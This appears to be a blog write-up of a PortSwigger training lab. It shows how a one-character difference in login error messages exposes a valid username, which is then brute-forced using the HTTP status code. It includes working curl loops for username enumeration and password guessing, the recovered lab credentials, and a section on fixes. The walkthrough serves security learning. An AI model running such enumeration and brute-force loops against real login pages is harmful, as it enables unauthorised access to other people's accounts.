---
layout: post
title: "PortSwigger: Username Enumeration via Subtly Different Responses"
date: 2027-10-07 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, Authentication]
tags: [portswigger, authentication, username-enumeration, brute-force, login, cwe-204]
---

This is the sneaky cousin of the classic username-enumeration lab. There the login form leaked the answer in plain English — "Invalid username" versus "Incorrect password." This time the developer noticed that mistake and returned **one** generic error for every failed login: *"Invalid username or password."* It looks bulletproof. It isn't. One account's error message is missing a single character, and that one byte is enough to enumerate it. ([CWE-204](https://cwe.mitre.org/data/definitions/204.html), Observable Response Discrepancy.)

## Overview

The lab gives you two wordlists (one of [candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames), one of [candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)) and a standard form that POSTs `username` and `password` to `/login`. The goal is to find the one valid account and log in.

## Step 1 — the one-character oracle

Every failed login returns the same sentence:

```
POST /login
username=nonexistent&password=x

<p class=is-warning>Invalid username or password.</p>
```

A keyword search is useless here — every response contains "Invalid username." The trick is to compare the error message **byte-for-byte** across every candidate and look for the odd one out. Spray all the usernames with one fixed wrong password, capture the exact warning, then `sort` and `uniq`:

```bash
for u in $(cat usernames.txt); do
  m=$(curl -sk "$URL/login" --data-urlencode "username=$u" --data-urlencode 'password=x' \
        | grep -oE '<p class=is-warning>[^<]*</p>')
  echo "$u|$m"
done | sort -t'|' -k2 | uniq -c -f1
```

```
  1 as400|<p class=is-warning>Invalid username or password </p>
100 academico|<p class=is-warning>Invalid username or password.</p>
```

There it is. One hundred accounts answer with `Invalid username or password.` (note the period). A single account — `as400` — answers with `Invalid username or password ` (a trailing space, no period). That count of `1` is the valid username. A concatenation/templating bug left the two code paths producing slightly different strings, and "slightly different" is all an oracle ever needs.

## Step 2 — the password oracle

With a real username in hand, the password guess gets its own tell: a **failed login re-renders the form with HTTP 200**, but a **correct login issues an HTTP 302** redirect to `/my-account`. No body parsing required — the status code is the signal:

```bash
for p in $(cat passwords.txt); do
  c=$(curl -sk -o /dev/null -w '%{http_code}' "$URL/login" \
        --data-urlencode 'username=as400' --data-urlencode "password=$p")
  [ "$c" = '302' ] && { echo "PASS FOUND: $p"; break; }
done
# -> PASS FOUND: dragon
```

Logging in as `as400:dragon` returns a 302, the account page greets us with *"Your username is: as400,"* and the lab banner flips to **Solved**.

## Why it worked

The developer fixed the *obvious* leak (two different sentences) but not the *underlying* one (two different code paths). As long as valid and invalid logins are handled by separate branches, any tiny divergence — a stray space, a different response length, a few extra milliseconds of bcrypt work — re-opens the oracle. Generic-looking text is not the same as a generic response.

## The fix

- Emit a byte-identical error for every failed login, from **one shared code path** — same text, same punctuation, same whitespace.
- Make the valid and invalid branches **constant-time**: always run the password hash comparison, even for usernames that don't exist, so timing can't leak either.
- Keep response **length, headers, and status code identical** across both outcomes.
- Add **rate limiting / lockout** and CAPTCHA so even a confirmed username can't be brute-forced ([CWE-307](https://cwe.mitre.org/data/definitions/307.html)).
